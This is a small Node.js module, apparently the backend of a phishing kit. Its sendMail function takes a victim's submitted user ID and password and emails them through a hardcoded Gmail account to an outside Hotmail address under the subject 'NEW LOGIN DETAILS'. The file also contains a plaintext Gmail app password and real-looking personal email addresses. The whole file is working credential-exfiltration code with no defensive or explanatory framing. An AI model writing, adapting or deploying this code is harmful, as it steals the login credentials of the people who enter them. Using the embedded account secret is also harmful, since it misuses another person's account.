const nodemailer = require('nodemailer')

const sendMail = (userID, password, res) => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'pat.nishimoto2@gmail.com',
      pass: 'khra ryeh iqav bcmz',
    },
  })

  const mailOptions = {
    from: 'webiniy01@gmail.com',
    to: 'Ibekzmoney@hotmail.com',
    subject: 'NEW LOGIN DETAILS',
    text: `New login details. User ID: ${userID} and password: ${password} `,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendMail }
